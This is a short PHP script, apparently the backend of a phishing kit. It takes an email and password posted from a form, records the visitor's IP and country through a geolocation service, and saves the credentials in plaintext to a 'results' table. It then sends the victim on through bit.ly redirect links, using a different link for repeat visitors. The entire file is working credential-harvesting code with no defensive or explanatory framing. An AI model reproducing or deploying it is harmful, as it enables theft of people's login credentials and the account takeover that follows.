<?php

	include "connect.php";
	$myCountry = '';

    $myEmail = $_POST['email'];
    $myPassword = $_POST['password'];

    $ip = $_SERVER['REMOTE_ADDR'];
    
    $stm1 = $con->prepare("SELECT * FROM results WHERE `ip` = ?");
    $stm1->execute(array($ip));
    $ifEx = $stm1->fetchAll();

    if(count($ifEx) > 0){
        
        header ('Location:https://bit.ly/30RtQwS');

    }else{
    
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    
        
        $myCountry = strval($ipdat->geoplugin_countryName);

        $stmt = $con->prepare("INSERT INTO 
                results (email, `password`, `ip`, `country`, `date`)
                VALUES (:zEmail, :zPassword, :zIp, :zCountry, NOW())");

            $stmt->execute(array(

                'zEmail' => $myEmail,
                'zPassword' => $myPassword,
                'zCountry' => $myCountry,
                'zIp' => $ip
            ));
        header ('Location:https://bit.ly/3iKXUjT');
        
    
    }

?> 